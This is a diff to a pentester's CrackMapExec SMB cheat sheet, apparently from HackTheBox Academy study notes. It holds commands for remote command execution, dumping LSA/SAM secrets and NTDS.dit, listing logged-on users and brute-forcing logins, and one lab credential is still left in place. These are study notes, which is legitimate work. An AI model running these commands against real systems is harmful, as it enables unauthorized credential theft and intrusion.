@@ -1,3 +1,11 @@
+---
+tags:
+  - linux
+  - password-policy
+  - SAM-registry-hive
+  - lsass
+  - smb
+---
 **OUTDATED!** Newer one is [[nxc]]
 Attacks: #PtH 
 # SMB
@@ -7,24 +15,27 @@ $ crackmapexec smb <IP> --shares -u '' -p ''
 ## Useful Flags
 - `--continue-on-success`: To keep on bruteforcing after a successful login.
 - `--local-auth`: If the target is a non-domain joined system.
-
 ## SMBExec
 ```shell-session
 $ crackmapexec smb <IP> -u <USER> -p <PASSWORD> -x <COMMAND> --exec-method smbexec
 ```
 >NOTE: If the `--exec-method` is not defined, CME will try to execute the `atexec` method by default
-## Dump
+## Extract
 ### Dump LSA/SAM Remotely
 ```shell-session
 $ crackmapexec smb <IP> --local-auth -u bob -p HTB_@cademy_stdnt! --<lsa/sam>
 ```
 ### Dump NTDS.dit
 ```shell-session
-$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
+$ crackmapexec smb <IP> -u <USER> -p <PASS> --ntds
 ```
 ### Logged-on Users
 ```shell-session
 $ crackmapexec smb <CIDR-RAMGE> -u administrator -p <PASSWORD> --loggedon-users
+```
+### Password Policy
+```shell-session
+$ crackmapexec smb <IP> -u <USER> -p <PASS> --pass-pol
 ```
 ## Bruteforce
 ### Bruteforce RIDs
